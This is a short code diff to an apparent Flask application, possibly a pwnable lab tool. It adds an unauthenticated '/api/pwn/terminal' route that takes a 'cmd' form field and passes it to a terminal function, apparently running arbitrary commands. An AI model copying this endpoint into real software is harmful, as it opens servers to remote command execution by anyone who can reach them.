@@ -110,6 +110,12 @@ def post_data():
         form=request.form.get('data')
     )
 
+@app.route('/api/pwn/terminal', methods=['POST'])
+def terminal_run():
+    command = request.form.get('cmd')
+    print (pwnable.terminal(command))
+    return pwnable.terminal(command)
+
 @app.route('/<cate>/<menu>')
 def show_form(cate=None, menu=None):
     return render_template('form.html', title=cate+'-'+menu)
